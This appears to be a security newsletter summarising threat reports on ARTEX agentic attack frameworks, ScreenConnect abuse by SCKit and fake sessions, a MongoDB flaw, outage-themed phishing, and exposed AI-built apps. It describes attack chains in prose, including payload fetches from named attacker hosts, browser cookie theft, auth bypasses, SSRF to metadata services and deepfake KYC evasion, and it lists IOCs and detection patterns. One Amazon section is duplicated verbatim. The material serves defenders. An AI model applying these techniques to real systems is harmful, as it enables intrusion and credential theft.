item.title: ARTEX: Inside an Agentic Attack Framework
item.description:
ARTEX, a Chinese 🇨🇳 open-source pentest framework, is now an intrusion engine: LLM agents turn an objective into commands and chain recon through exfiltration. The FBI issued a FLASH alert on November 13, and Storm-0940 reached privileged access in under three hours.
- Origin and spread: ARTEX hit GitHub in July 2026 and its developer pulled the repo on October 8 after threat actors adopted it. Forks, translations, and rebrands remain. Censys counted 1,465 exposed consoles on November 5, Check Point counted 1,608 instances, and Reveal Labs identified 3,447 ARTEX hosts. About 9.5% of those held files from at least one other agentic framework, most often CyberStrike AI. GitGuardian tracks roughly 45 other open-source agentic attack frameworks.
- In the wild: GTIG saw use as early as August 2026. In late September, a likely Chinese-speaking, financially motivated actor breached 16 South Korean 🇰🇷 financial firms using ARTEX with DeepSeek as the primary LLM, hitting internet-facing apps and exfiltrating PII (CrowdStrike). Microsoft tracked China-aligned Storm-0940 automating attacks on hundreds of organizations, then using compromised ConnectWise Cloud Backup application credentials to automate authentication attempts against more than 2,250 Microsoft 365 tenants. In some tenants the actor used Microsoft Graph to discover cloud resources, modify application credentials, and persist. ConnectWise suspended Cloud Backup during its investigation. Cambodia-based Storm-3358 has used ARTEX against financial institutions since October. Agents used curl and netcat to pull down open-source RATs WISP, Vshell, and AdaptixC2 for persistence and lateral movement.
- How it works (Reveal Labs lab, using ScopeWeaver, an English rebrand fork with the same multi-agent design): a planner agent splits an objective into intents and hands them to concurrent worker agents that run standard security tools. Workers write findings to a PostgreSQL database, which feeds the next planning round. In testing, it failed over SSH, then via RDP (Remmina), sshpass, and CrackMapExec, ran Nmap, found WinRM on 5985 and 5986, then tried PsExec, xfreerdp, rdesktop, Evil-WinRM, and Test-WSMan. It declared success after a Test-WSMan connectivity check even without a shell. In a second run, Impacket PsExec gave it a shell and it set the NoLockScreen registry value to 1.
- Network artifacts: user-agent strings scopeweaver, artex-enrich/1.0, and Mozilla/5.0 (spa-api-recon). LLM API JSON payloads carried function names list_findings, record_fact, and shell_send, visible only if you can decrypt the TLS. Idle workers sent keep-alives about every five seconds. None of these is unique to ARTEX. Most of the time the framework runs outside your network, so you only see its attack traffic, not its LLM or worker chatter.
- Tempo is the tell: GTIG saw task bursts of roughly 2 to 25 seconds, and one attack produced 240 log events while the agent worked through technical obstacles. Expect trial and error: repeated auth failures, rapid switching between remote access methods, and several detection types on the same host in a short window.
Takeaway: the techniques are old, so hunt behavior and timing, not tool names. Correlate scanning followed by exploitation within minutes, servers with an exploitation alert that make a first-time outbound LDAP, RMI, or HTTP connection to an external IP within 10 minutes, and any device with multiple distinct detection types in 24 hours. Search proxy and HTTP logs for the three user-agent strings. In Microsoft 365, review recent application credential changes and Graph-driven resource discovery tied to third-party backup apps like ConnectWise Cloud Backup. Preserve failed-auth bursts and tool artifacts such as Impacket PsExec service launches, since a failed agent still leaves a trail. The report lists the user-agents and payload function names but no infrastructure IOC table.

item.title: Siri app conversations
item.description:
macOS 27 (Golden Gate) adds a Siri app that keeps persistent conversation history in a SQLite database. The write-up shows where it lives and how to parse it, including entries flagged as removable.
- Why it matters: Siri is now in Unified Search (Cmd+Space, the old Spotlight bar) and in right-click menus across the OS and many third-party apps. The report's example is "Ask Siri" on an email in Microsoft Outlook, with the reply saved in Siri conversations. Most Siri interaction, even without opening the app, ends up stored there. The default retention setting on the author's machine was Forever, with 30 days and 1 Year as the other options. Unless someone changed it, a lot of user-to-Siri content may be recoverable.
- Where to look: ~/Library/Daemon Containers/<UUID>/Data/AgentSessionKit/AgentSessionStore.sqlite. The UUID differs on every host. Events are stored in ZAGENTSESSIONEVENTENTITY. Session records are in ZAGENTSESSIONRECORDENTITY, which the report's query joins to the event table on ZSESSION = Z_PK. Agent identity comes from ZBUNDLEID in ZAGENTPROVENANCEENTITY.
- Parsing: the report gives a full query. It returns the agent bundle ID, session ID, pinned flag, session and event creation times, summary, title, role (ZROLERAWVALUE), message text (ZTEXTCONTENT), source bundle ID, and record last-modified time. Timestamps are Cocoa epoch, so the query adds 978307200 before converting with unixepoch. Do the same in any ad hoc work or the times will be wrong.
- Attachments: Siri can process files, but the main query does not return them. Files are generally not stored in the database. They are referenced in ZARTIFACTENTITY, usually as a JSON string with nested bookmark objects and plists. Some of those hold bookmarks to files on disk, so you may be able to tie a Siri conversation to a specific file the user handed over.
- Deletion angle: ZPERSISTABLESTATERAW in ZAGENTSESSIONRECORDENTITY indicates whether an entry can be removed. At zero, the entry does not show in the conversations UI and can be purged later. The report shows session 15 with no events retained while session 17 still has data. So the session records and their state flags are worth reviewing alongside the visible conversation list, because the UI view may not match what the database holds.
Takeaway: on macOS 27 triage, collect the AgentSessionKit folder from the Daemon Containers path and check the retention setting. Run the report's query, then review ZARTIFACTENTITY for bookmarks to files that were fed to Siri. Compare ZPERSISTABLESTATERAW values against what the UI shows. The query is in the report. A Siri App plugin has been added to mac_apt, and standalone databases can be read with mac_apt_artifact_only.

item.title: School Bomb Threats: Hudson Rock Finds Reported Sender Accounts in Infostealer Data
item.description:
Hudson Rock found records for both university addresses reported in Italy 🇮🇹 school bomb-threat emails in infostealer data: a 2021 Vidar log from Egypt 🇪🇬 and a historical AlienTXTBASE entry from Taiwan 🇹🇼.
- Egyptian 🇪🇬 address: Mosaad_Khalifa[@]den.kfs[.]edu[.]eg matches a machine that Hudson Rock's Cavalier platform classifies as Vidar-infected. The system-information file is dated October 1, 2021, on Windows 7 Ultimate 64-bit. The Chrome password export holds 112 records, 20 of them using the university address, including two saved against Microsoft sign-in pages: login.microsoftonline[.]com/common/oauth2/authorize and ccs.login.microsoftonline[.]com/ccs/common/oauth2/authorize. The log also shows password reuse across services. The "Unresolved" label in the interface does not prove the password still worked in 2026.
- Taiwanese 🇹🇼 address: f0523219[@]cloud.dyu[.]edu[.]tw was published by IIS G. A. Remondini, a recipient school. Focus Taiwan 🇹🇼 reported that Da-Yeh University found an alumnus account had sent a large volume of mail and appeared compromised, so it suspended the account. Hudson Rock found a Microsoft URL-login-password entry for it in AlienTXTBASE, assesses the entry as infostealer-derived, and dates it to more than a year before the threats.
- Scope: ANSA, citing the Education Ministry, reported roughly 6,000 Italian 🇮🇹 schools received the messages. That is a recipient count, not an evacuation count. The emails signed as "Mikhail Andropov," which is a sender claim, not attribution. Police in Northern Ireland 🇮🇪 reported 300+ schools got the same message, and Police Scotland assessed its cases as hoaxes. The Journal said different addresses were used for school and media threats, so these two findings do not show a common operator.
- The missing link: Hudson Rock states that nothing yet shows these stolen credentials sent the threats. The report does not establish token theft or an MFA bypass for either account. Passing email authentication checks also would not prove a particular stolen password was used. The report says provider authentication and mail-delivery records are needed to settle it.
Takeaway: when a reported sender address looks like a hijacked institutional account, preserve the original message with full headers first. Then pull provider message traces, sign-in events, and audit records to see which identity, application, or session submitted the mail. Check whether the address appears in infostealer exposure data and how old the record is. If it does, containment covers more than a password reset: revoke sign-in sessions and refresh tokens, review app passwords, authentication methods, application consent, and mailbox rules, and remediate the endpoint, since an infected device can steal the replacement secrets. Review the account's sign-ins and outbound mail for sudden bulk sending.

item.title: Over 35,000 Grok-Built Apps Exposed Online, Some Leaking Confidential Data and Passwords
item.description:
Claroc found 37,571 Grok-built apps online, and 35,578 opened for anyone without a sign-in. About 1 in 10 held internal or personal data. The open apps included 24 built by staff at X and SpaceXSI, which have since been taken down.
- Exposure path: every published app gets its own grok[.]me subdomain. In the paid account the researchers used, the publish step offered "Anyone with the link", "Invited users" and "Only you", with "Anyone with the link" already selected. Grok suggests 4 random words as the app name, and about half of the names found followed that pattern. That obscurity fails because opening an app triggers a DNS lookup for its subdomain, passive DNS services record those lookups, and anyone with an account can search them by pattern. The researchers used common subdomain discovery methods and loaded each app's first page once, without signing in.
- What leaked: roughly 2% of open apps held material the researchers rate high or critical. Examples include a hospital group's searchable list of more than 3,500 employees, an intensive care briefing on a single patient, a fire department's live shift board, and a contractor timesheet whose code held every employee's password in plain text. The staff apps included a confidential sales hire onboarding plan, a territory map of 594 accounts, and an X advertising proposal to a U.S. 🇺🇸 federal agency. Internal data from 30 other identifiable organizations was also open. 26 of them have more than 1,000 employees and 6 are Fortune 500 companies.
- Generated auth is weak: the researchers built 2 test apps with made-up data and published both with the default setting. The contact list got a database but no sign-in, and a row added from a private browser window showed up for the next visitor. The customer list got "Continue with Google" and "Continue with X" buttons, but Grok's code added each person who signed in to the team before checking membership, so the check always passed. An uninvited Google account viewed every customer, edited one record and deleted another. The researchers tested only their own apps, not any of the open ones they found.
- Vendor response and context: the researchers reported to SpaceXSI via security.txt, 2 staff apps on Sunday and the other 22 on Monday. At publication the company had not replied to them, but it told a reporter that apps stay private until shared and that employee accounts default to "Only you". It took down the 24 staff apps but not other users' apps. The researchers asked for "Only you" as the default and an option limiting apps to a company email domain. They have started emailing affected organizations themselves, with 3 notified by publication. In their comparison, a shared ChatGPT app defaulted to "Only me". The same team's October 18 Muse research showed Meta AI agent pages were also findable via passive DNS, and Meta disabled sharing and announced a fix on October 22.
Takeaway: treat AI app builders as shadow IT with a public data path. Inventory which builders your staff use, since they need no IT setup or company account. Query passive DNS for the builders' domains, including grok[.]me, and open any hits tied to your organization in a private browser window. An app set to "Only you" returned a 401 for both the page and its data to a stranger in the researchers' tests. Then try signing in with an account from outside your company, because if it gets in, the app needs an allow list. Read the scripts each app loads for names, emails and passwords. For anything holding internal data, preserve a copy of the page and scripts for scoping before you unpublish. Unpublishing took apps offline within seconds in the tests. Rotate any credentials found in client code and treat the contents as exposed.

item.title: Critical Pre-Auth MongoDB Flaw (CVE-2026-118383) Can Crash Lagging Servers on Failover
item.description:
CVE-2026-118383, a pre-auth use-after-free in MongoDB Server (CVSS 4.0 9.5), lets an unauthenticated client plant two requests that crash a lagging replica set member once it wins an election. MongoDB says it knows of no exploitation attempts.
- Mechanism: the two requests are ping commands carrying a readConcern.afterOpTime value. Each makes the server record a pending notification, a waiter. Planting them does not crash anything. The waiters persist until the member restarts, rolls back, or steps down. If that member later wins an election while behind, the cleanup at the end of primary catch-up runs twice on already-freed memory. The new primary crashes before accepting writes, and the crash does not depend on a timing race. MongoDB says code execution is possible under certain conditions, but Datadog Security Labs did not achieve it in their lab.
- Scope: members of replica sets, including shard and config server members of sharded clusters. A standalone mongod is not affected. Every earlier version in an affected branch is vulnerable, back to the branch's first release. Turning on authentication does not stop the two requests on vulnerable versions. The researchers stress the attacker cannot make a member fall behind, win an election, or see either happen. In the lab they paused and stopped mongod processes with admin access to force it. On 8.0.34 the member segfaulted and left the lab cluster with no primary.
- Fix: 8.0.37 rejected both requests as unauthorized immediately. One part restricts readConcern.afterOpTime to system users. A second part stops the cleanup from running twice even when waiters exist. The researchers did not test that second part themselves. In the proof-of-concept lab with authentication off, 8.0.37 accepted the waiters but ran cleanup once. Fixed releases per branch are in the CVE record. Atlas clusters get fixes during maintenance, so deferred maintenance leaves them exposed.
- 8.2 caveat: 8.2 is not in the affected list, and 8.2.12 is its newest release. But a public proof of concept reports 8.2.12 still showed the bug using a test-only setting a remote attacker cannot enable. The branch reached end of life on July 31, so it gets no security fixes. Treat any 8.2 replica set as an upgrade candidate.
- Log evidence from the researchers' vulnerable run: a COMMAND "Slow query" entry (ID 51803) for an unauthenticated ping with readConcern.afterOpTime ending in MaxTimeMSExpired. Then a member entering primary catch-up (ID 21359) and exiting it twice (ID 21363) in a single transition. Then a fatal signal or backtrace involving CatchupState::abort_inlock(). A normal election or a single catch-up exit does not indicate this flaw.
Takeaway: scope first. Inventory every replica set, shard, and config server member and confirm the running version on each, including containers and members that were offline during maintenance. Then hunt backward from any unexplained primary crash or failover. Search structured logs on the crashed member for ID 21363 appearing twice in one transition, then pivot to earlier logs from the same member for ID 51803 pings with afterOpTime, since the planting can precede the failover by a long time. Request fields are only logged depending on logging settings, and attr.remote may show a loopback address instead of the real client IP, so absence of evidence is weak. Preserve logs and core dumps before restarting members, because a restart clears planted waiters. Until upgrades land, restrict network access to only the systems that need it. That limits who can send the requests but does not fix the flaw.

item.title: ARTEX and beyond: AI-enabled penetration testing platforms
item.description:
ARTEX, an open-source AI pentest framework published in July 2026, is already driving real intrusions by China 🇨🇳 nexus and financially motivated actors. Microsoft saw its agents turn exposed credentials into cloud secrets access in minutes.
- Framework: ARTEX was released on GitHub by a developer using the pseudonym Autumn-27. An operator sets a target and objective, a planner agent splits it into tasks, worker agents run security tools, and results land in a shared graph. It works with different LLMs and needs little input once running. It ships with no C2 of its own, but MCP extensibility lets operators bolt on tools, and Talos has seen it deployed alongside VShell, GoPhish, and AdaptixC2. Related frameworks: Hephaestus is controlled via Telegram, PentAGI has a web UI (Talos found more than 700 reachable instances), and HexStrike AI plugs into MCP clients like Claude Code.
- Campaigns: CrowdStrike attributes an espionage campaign beginning Oct. 17, 2026 to China 🇨🇳 nexus VAPOR PANDA, targeting more than 200 organizations in at least 14 countries, with confirmed post-compromise activity at nine and spraying against at least 12 more. Microsoft ties Storm-0940 to ARTEX-driven sign-in attempts against more than 2,250 downstream Microsoft 365 tenants after ConnectWise application credentials were compromised. Storm-3358, described as Cambodia-based and financially motivated, used it against financial organizations, then deployed WISP, VShell, and AdaptixC2. An unattributed, likely Chinese-speaking group exfiltrated data from South Korean 🇰🇷 financial organizations. Talos found ARTEX-related artifacts there, including directory listings and prompt history references but not the executable or source tree, which suggest an ARTEX environment but do not prove the full framework was used.
- Credentials and cloud: Microsoft saw agents search public GitHub repos for exposed application credentials and AI API keys, then in one case reach Azure Key Vault exfiltration within five minutes. Datadog saw AWS activity involving anonymous S3 requests, compromised long-term access keys, CloudWatch log searches for financial data and secrets, and public Cognito user pools where agents registered accounts and collected tokens. Dosu reported an attacker pivoting from an authorization flaw to CI, a database, and cloud systems with more than 80,000 requests in 90 minutes.
- Post-compromise: These behaviors are actor-specific, not ARTEX defaults. CrowdStrike describes VAPOR PANDA forging an administrator token from historical authentication material, reading mailboxes, and reaching the internal network via recovered VPN information, plus web shells and the BLOODALCHEMY backdoor. Talos notes ARTEX has demonstrated EDR bypass capability.
- Infrastructure overlap: Talos identified more than 2,500 ARTEX-associated C2 IPs and checked which tools co-occurred on them. Most frequent: ScopeWeaver, AntiFox, CyberStrikeAI, PentAGI, ScopeSentry, then VShell, Nessus, Interactsh, Acunetix, Fscan, NPS, AdaptixC2, Mimikatz, Cobalt Strike, Gophish, and Chisel. Co-occurrence does not prove ARTEX invoked each tool or that one actor ran them all.
Takeaway: behavior varies by target and operator, so hunt for tempo and identity abuse. Correlate authentication, cloud API, and endpoint logs for high-volume requests, unfamiliar applications, token use, and permission or role changes. Check Microsoft Graph activity from application credentials, Key Vault access after secret exposure, and Cognito sign-ups. Treat tool signatures and user agents as leads, since they change. Keep independent telemetry in case EDR is tampered with, and rehearse mass revocation of credentials and tokens. IOCs are in the Talos GitHub repository the report points to.

item.title: Amazon Threat Intelligence observes threat actors running cybercrime campaigns with ARTEX AI agents
item.description:
Amazon's MadPot decoy sensors caught ARTEX agents, an open-source agentic pentest framework, sending their own campaign memory to fake LLM APIs. Amazon assesses with moderate confidence that Chinese 🇨🇳 nexus groups ran AI credential theft and KYC deepfake fraud.
From Oct. 3 to Nov. 5, 2026, MadPot sensors posing as popular LLM chat-completions endpoints received requests from ARTEX agents that treated them as inference backends. Because agent frameworks resend their history, single requests often carried the persistent task context, system prompts, tool histories, knowledge-graph state, and findings of a whole campaign.
- Caveat on the evidence: Amazon did not see the activity as it happened, and it cannot verify the outcomes the agents reported. The records show what the actors were pursuing, across hundreds of targets. Attribution to ARTEX rests on prompt references to ARTEX tooling and related artifacts. The Chinese 🇨🇳 nexus call rests on simplified Chinese 🇨🇳 prompts, China 🇨🇳 time-zone configs, targeting, and tooling. Both are moderate confidence, and the operators appear to be disparate groups.
- How the agents work: planner, worker, verification, and compression agents share a persistent knowledge graph that acts as the operation's memory. Standing prompts set the mission. One set told agents to work a fixed country sequence, favor enterprise production sites over personal projects, and grade each credential: L1 a lead, L2 a confirmed working API call, L3 quantified impact such as readable data or spendable balance. Keys exposed publicly for more than 30 days were written off as low-value inventory. Red lines excluded mainland China 🇨🇳 targets and government domains, and all outbound traffic had to go through proxies.
- Campaign 1, AI credential theft: stolen keys went into the framework's own model gateway and paid for the LLM inference that hunted more keys. Targets were key-aggregating gateways (One API, New API, Veloera, Sub2API, LiteLLM) and AI app builders (Dify, FastGPT, Langflow, RAGFlow, Open WebUI, LobeChat, Ollama). The playbook covered claimable uninitialized installs, anonymous management and provider-config endpoints, default admin credentials such as the LiteLLM default master key, CVE-2025-3248 (Langflow), CVE-2026-28797 (RAGFlow), an authentication bypass via the isCliRequest header in One API family systems, SSRF through URL-fetch features to cloud metadata services, and secrets in client-side JavaScript, source maps, debug routes, and environment files. Discovery pulled from internet scanning services, certificate transparency, GitHub repos and event archives, npm and PyPI tarballs, container image layers, notebooks, model-hosting spaces, paste sites, and Telegram channels. Cloud credentials were validated through provider identity services, then used to enumerate storage and go after managed AI services, secrets and parameter stores, and application identities.
- Campaign 2, KYC bypass with deepfakes: agents targeted two cryptocurrency exchanges, reverse-engineering one vendor's liveness protocol (face-detection event stream, face tracking, coordinate system). Their best recorded attempt landed within 7 pixels of the target, yet the vendor's server-side verdict rejected the deepfake in every recorded attempt. A separate session built a real-time deepfake pipeline on one consumer GPU with an open-source face animation model, reaching 11.5 frames per second. For forged ID photos, agents built synthetic camera metadata matching the real JPEG dimensions and kept the original camera compression tables, so edited images looked untouched at the file level. At least four sessions ran in parallel: cash-out research, balance clearing, deepfake pipeline, and verification bypass.
- Scope: the report says none of the techniques were new. The agents won where basics were missing: default or hardcoded credentials, keys in code and public artifacts, unauthenticated interfaces and inference endpoints, and unpatched software.
Takeaway: treat AI gateways, app builders, and inference endpoints as production assets. Check them for the exposures above, and look for the isCliRequest header and URL-fetch features reaching cloud metadata services. Rotate any key that has appeared in a repo, package, image layer, or paste. Watch for unexpected spend or unusual usage on AI services, which can signal misuse of stolen keys. Campaign-tagged IPv4 IOCs are in the report's table, so match them against your inbound logs.

Keys exposed publicly for more than 30 days were written off as low-value inventory. Red lines excluded mainland China 🇨🇳 targets and government domains, and all outbound traffic had to go through proxies.

- Campaign 1, AI credential theft: stolen keys went into the framework's own model gateway and paid for the LLM inference that hunted more keys. Targets were key-aggregating gateways (One API, New API, Veloera, Sub2API, LiteLLM) and AI app builders (Dify, FastGPT, Langflow, RAGFlow, Open WebUI, LobeChat, Ollama). The playbook covered claimable uninitialized installs, anonymous management and provider-config endpoints, default admin credentials such as the LiteLLM default master key, CVE-2025-3248 (Langflow), CVE-2026-28797 (RAGFlow), an authentication bypass via the isCliRequest header in One API family systems, SSRF through URL-fetch features to cloud metadata services, and secrets in client-side JavaScript, source maps, debug routes, and environment files. Discovery pulled from internet scanning services, certificate transparency, GitHub repos and event archives, npm and PyPI tarballs, container image layers, notebooks, model-hosting spaces, paste sites, and Telegram channels. Cloud credentials were validated through provider identity services, then used to enumerate storage and go after managed AI services, secrets and parameter stores, and application identities.

- Campaign 2, KYC bypass with deepfakes: agents targeted two cryptocurrency exchanges, reverse-engineering one vendor's liveness protocol (face-detection event stream, face tracking, coordinate system). Their best recorded attempt landed within 7 pixels of the target, yet the vendor's server-side verdict rejected the deepfake in every recorded attempt. A separate session built a real-time deepfake pipeline on one consumer GPU with an open-source face animation model, reaching 11.5 frames per second. For forged ID photos, agents built synthetic camera metadata matching the real JPEG dimensions and kept the original camera compression tables, so edited images looked untouched at the file level. At least four sessions ran in parallel: cash-out research, balance clearing, deepfake pipeline, and verification bypass.

- Scope: the report says none of the techniques were new. The agents won where basics were missing: default or hardcoded credentials, keys in code and public artifacts, unauthenticated interfaces and inference endpoints, and unpatched software.

Takeaway: treat AI gateways, app builders, and inference endpoints as production assets. Check them for the exposures above, and look for the isCliRequest header and URL-fetch features reaching cloud metadata services. Rotate any key that has appeared in a repo, package, image layer, or paste. Watch for unexpected spend or unusual usage on AI services, which can signal misuse of stolen keys. Campaign-tagged IPv4 IOCs are in the report's table, so match them against your inbound logs.

item.title: Microsoft 365 outage theme drives credential phishing and support scams
item.description:
Outage-themed lures are circulating after the November 12, 2026 Microsoft 365 incident: fake quarantine digests, support scams and payment redirection. The lasting danger is what attackers leave behind after a password reset.
- The trigger: Microsoft reported a suite-wide degradation starting 18:26 UTC on November 12, centered on Exchange Online, with knock-on effects for Outlook, calendar and some Teams tasks. Downdetector reports came from 74 countries and territories within about an hour. Microsoft cites an unexpected failure that took several servers offline and strained the rest, and says it has found no evidence of malicious activity. The root cause is still under investigation. The lures are opportunistic and tied to the event, not to a compromise of Microsoft.
- The lure Field Effect's SEAS caught on November 13: a credential phishing email posing as a Microsoft notification. The subject is "Outage - " plus a random six-character string. The body claims four messages are held after the outage and will be deleted within 24 hours, copying the quarantine digest format. It cites Incident ID EX1550543, which matches the ID reported for Microsoft's real Exchange Online incident. A "RESTORE MESSAGES" button leads to a credential harvesting page. The same text has been reported at other organizations, which points to a distributed campaign.
- Other variants: fake Outlook password reset emails and texts appeared within hours. Australia's 🇦🇺 National Cyber Security Coordinator urged caution, and the Royal Dutch 🇳🇱 Pharmacists Association warned of phishing offering account recovery, MFA changes and Microsoft updates. Another lure claims inactive accounts are being deactivated. Researchers also report Microsoft support impersonation with fake reset links and refund offers, plus payment redirection: a "manager" or "supplier" says email is down and texts a request to pay a new account. Phone, SMS and Teams contact bypass email filtering, and Quick Assist sessions are user-authorized, which reduces security alerts.
- Why responders should care: each lure needs a user action, such as entering a password, approving an MFA prompt, reading out a code or allowing a remote session. A reset closes only the original access path. Inbox rules, mailbox forwarding, OAuth app consents and newly registered MFA methods created with stolen credentials stay active until removed. A forwarding rule can redirect supplier invoices, a trusted mailbox can phish colleagues, and a compromised admin account extends reach across the tenant. Many security teams also lost access to Defender XDR and Outlook-delivered alerts during the outage, so there may be a visibility gap.
- Scope of risk: finance staff, executives and helpdesk teams likely carry the most risk because their accounts control payments, sensitive data and password resets. Microsoft was the most impersonated brand, at 33% of brand phishing attempts in Q3 2026. The report notes the same pattern after the 2024 CrowdStrike outage, when attackers pushed malware disguised as a fix.
Takeaway: scope by user, not just by message.
1. Search message trace and Defender Threat Explorer for mail that mentions the outage alongside restore, verify, password reset, MFA or refund language and a link. Then purge and block the senders, domains and links. 2. For every user who interacted, review Entra ID sign-in and audit logs from November 12 for new sign-in locations, OAuth consent grants and MFA method registrations. Check the Purview unified audit log for inbox rule and forwarding creation. 3. Remove unauthorized rules, consents and auth methods, then reset passwords and revoke sessions and tokens. 4. Export logs covering the outage window now. Entra logs are retained for 30 or 90 days depending on licensing. 5. Review remote access tool installs since November 12 and Quick Assist sessions, and look for PowerShell or remote management activity after a support session.
Verify payment, banking and MFA change requests by calling back a known number. Genuine quarantine digests come from quarantine[@]messaging[.]microsoft[.]com with the subject "Microsoft 365 security: You have messages in quarantine." Microsoft posts outage updates only on the admin center Service health page.

item.title: Attackers use Crypto Exchange Names to Disguise Unauthorized Sessions on 100+ ScreenConnect Servers
item.description:
Someone enrolled 2,223 fake crypto-exchange-named guest sessions on 118 self-hosted ScreenConnect servers across 109 MSP and organization accounts between Nov 3 and Nov 13. Huntress saw no malicious activity from them, but they look like bait for a technician to connect.
- How it was found: an MSP asked about unfamiliar always-online machines in its console, named things like KUCOIN-SRV, SRV-BINANCE, BACKUP-PROBIT, WORKSTATION-COINEX and DASH-BITMEX, with no company or owner. The server itself was clean: no web shells, suspicious child processes or new accounts. Huntress pulled App_Data\Session.db from servers it could reach and found the same pattern widely. On the first server, the Access installer was publicly downloadable, and a file-scanning service had fetched it in mid-October. ScreenConnect serves these installers without authentication by design, and the installer carries the relay address a guest needs to register.
- Infrastructure and behavior: about 97.8% of crypto-named guest connections came from 74.208.158[.]106, an IONOS-hosted VPS. The first three sessions on Nov 3 at 21:26 UTC came from 197.47.160[.]252, an Egyptian 🇪🇬 residential IP. A related IONOS host, 87.106.111[.]220, shares the JARM and TLS certificates but showed no guest sessions. On 29 servers with complete histories, the operator revisited every 151 seconds, connections lasted about 64 minutes, and reconnects came about every 55 minutes. That keeps the fakes showing as online.
- Emulator, not sandbox: every fake claims guest version 25.3.4.9288, sends no key, reuses seven screenshot families and randomizes hardware and OS details. Server-side, the fingerprint is ClientType 1 with an empty guest public key. Huntress finds it unlikely that this is Joe Sandbox detonating installers: sandbox runs send a key and real VM screenshots, and these campaigns revisited 100-plus servers in the same order daily for 10 days.
- Likely goal, unproven: the leading hypothesis is that technicians who join a fake session expose an unpatched workstation to CVE-2026-84869, the critical ScreenConnect client-side flaw disclosed Sept 8. A malicious guest could trigger file-transfer actions the technician's client accepts and runs without prompting, even with elevated rights. Huntress has not seen a crypto-named session push or run a file. Capturing technician keystrokes is also not ruled out. In one case a technician used "send text" twice, and because ScreenConnect does not retain sent text, Huntress treated it as possible credential exposure. Most technician joins lasted under 30 seconds. Huntress found no overlap with the published SCKit indicators.
- Evidence to protect: before deleting any fake, preserve Session.db and its WAL file. Session history shows whether a technician joined and whether files, commands or text moved. Separate technician-side from guest-side events: a fake alone only proves reachability. In one case a delete command was queued and delivered but never returned output, so verify removal.
Takeaway: hunt the server DB for ClientType 1 guests with an empty public key, version 25.3.4.9288, empty company or site fields, and exchange-plus-role names. In SIEM, look for many new Access guests from one external IP in a short window, especially 74.208.158[.]106. On technician workstations, flag ScreenConnect.WindowsClient.exe spawning cmd.exe, powershell.exe, wscript.exe or msiexec.exe with a file under Documents\*\Temp\, which is the host-side shape of CVE-2026-84869 exploitation. If an unpatched client joined a fake, inspect that workstation's ScreenConnect Temp and Startup folders and process history. The report's IOC table includes the SSH host key fingerprint for pivoting and the WebP thumbnail hashes. Upgrade host clients and affected Access agents to 26.6.5 or later, keep Access installer links private, and rebuild leaked installers.

item.title: SCKit abuses ScreenConnect to deploy remote access and target technician sessions
item.description:
SCKit abuses hijacked MSP ScreenConnect instances to push a rogue client onto customer endpoints, then sets traps for the technicians who connect. Removing the extra client does not remove the toolkit's persistence or exposed web sessions.
- Access: ConnectWise reported unauthorized access to cloud-hosted MSP ScreenConnect instances starting November 11, 2026, and Microsoft confirmed the activity. One reported route is a flaw in RMM+ extension versions 1.0.31 and 1.0.32. When no access key was configured, the extension accepted an empty key, so an unauthorized caller could submit commands through the server API. ConnectWise says the entry method for this campaign is still under investigation.
- Endpoint deployment: A ScreenConnect remote command starts cmd.exe, and curl.exe pulls ScreenConnect.ClientSetup.msi over HTTP with a c=Exploited<N> marker (c=Exploited9 in the example). It lands at C:\Windows\Temp\sc.msi and installs silently with /i /qn /norestart. That second client talks to an attacker-run ScreenConnect server, so locking down the legitimate console does not cut it. A batch launcher then fetches a PowerShell decoder from ns.mo7sen[.]dev/EadF.php?p=4 and runs it with -Mode full.
- Device-bound payload: The decoder reads MachineGuid from HKLM\SOFTWARE\Microsoft\Cryptography and sends it as the m parameter. The key derives from that GUID plus the X-Lab-Half and X-Lab-Salt response headers (SHA-256, XOR, PBKDF2, AES-256-CBC, GZip). The bundle unpacks to %TEMP%\SCKitBundle, so recover it from disk, because the payload is encrypted with device-specific key material. A second loader writes %TEMP%\k<32-hex>.ps1, runs it hidden, then tries to delete it.
- Persistence and RelayTrap: Scripts sit under C:\ProgramData\RelayTrap. A machine-wide Run value named RelayTrapLiteAlert fires at logon, and a scheduled task launches the watcher (TrapWatch.ps1 in the report's hash table) with -PollSeconds 10. The watcher reads each ScreenConnect client service, copies that client's libraries, and compiles RelayTrap.exe with the .NET C# compiler. When a technician connects with a vulnerable host client, RelayTrap tries to deliver the batch launcher through the session. Registry writes also add Defender path exclusions for staged MSI copies and CWInstall_...\Installer.ps1. The report treats technician-side spread as design intent, not confirmed infections.
- Technician sessions: SCKit hunts .ASPXAUTH cookies in Chrome, Edge, Opera, and Opera GX. It copies cookie databases (with a volume shadow copy fallback), decrypts with the Chromium master key via DPAPI and AES-GCM for v10/v11 values, and scans memory of processes carrying network.mojom.NetworkService using OpenProcess, VirtualQueryEx, and ReadProcessMemory. With a cookie it enumerates sessions and uses ToolboxRelayUploader.exe to queue payloads through the Shared Toolbox, then removes the Toolbox item. Reach follows the account's permissions. The decoder's cleanup mode also re-arms the dropper after cleanup unless -NoReArm is set, so never reuse the kit's cleanup script for remediation.
Network IOCs from the report: ns.mo7sen[.]dev, sc.payproofkit[.]com, cdn007-digitaldownloads[.]com, newnewnew.gotdns[.]org, soxnewwork.homedns[.]org, 185.99.255[.]28, 155.94.150[.]39. Unauthorized client IDs: 2588ef5c15954b10 and ed630cc2c873b091.
Takeaway: Scope technician workstations along with customer endpoints, and investigate through an out-of-band channel, not ScreenConnect. Preserve extension, authentication, Run Command, and Toolbox records alongside process, task, and registry history, and review Toolbox history for tools removed after use. Revoke ScreenConnect and identity-provider web sessions from a clean device, because password changes alone do not cover existing sessions. Hunt for RelayTrapLiteAlert, RelayTrap and TrapWatch tasks, k<32-hex>.ps1 files, and Defender exclusion writes. ConnectWise says client 26.6.5 and later block the endpoint-to-technician transfer (CVE-2026-84869, fixed September 8, 2026). A cloud console update does not update technician clients, so verify each version. Full hash tables and hunting queries are in the report.

item.title: ARTEX Unmasked | The Rise of AI-Powered ARTEX in Cybercrime & Espionage
item.description:
ARTEX, an open-source Chinese 🇨🇳 AI pentest platform, is now running real intrusions. SentinelOne reports at least five actors and clusters using it since late August 2026, from espionage groups to a Cambodia-based criminal cluster, at $145 to $1,500 in model time per campaign.
